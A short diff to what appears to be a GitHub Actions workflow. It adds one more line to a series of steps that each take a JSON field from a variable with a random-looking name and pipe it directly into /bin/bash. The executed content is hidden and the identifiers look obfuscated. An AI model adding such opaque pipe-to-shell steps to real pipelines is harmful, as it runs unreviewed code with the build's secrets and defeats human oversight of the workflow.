@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$eky64791" | jq -r .ntc532 | /bin/bash
           echo $b7 | jq -r .sxe3484 | /bin/bash
           echo $cavm105 | jq -r .txp1 | /bin/bash
+          echo $r5 | jq -r .a4971 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
